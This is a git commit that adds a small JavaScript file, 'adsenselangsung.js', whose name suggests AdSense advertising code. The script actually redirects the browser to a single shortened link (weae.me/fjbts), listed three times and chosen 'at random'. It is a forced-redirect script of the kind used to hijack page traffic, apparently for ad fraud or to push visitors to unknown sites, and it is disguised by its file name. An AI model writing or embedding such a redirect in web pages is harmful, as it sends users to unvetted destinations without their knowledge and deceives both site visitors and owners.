858ff6fbcef31efc2fc083341e541c6eb05973e3
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2025-05-24 10:17:36 +0700

    Create adsenselangsung.js

---
+++ adsenselangsung.js
@@ -0,0 +1,11 @@
+var dataUrl = [
+
+  'https://weae.me/fjbts',
+
+  'https://weae.me/fjbts',
+
+  'https://weae.me/fjbts'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
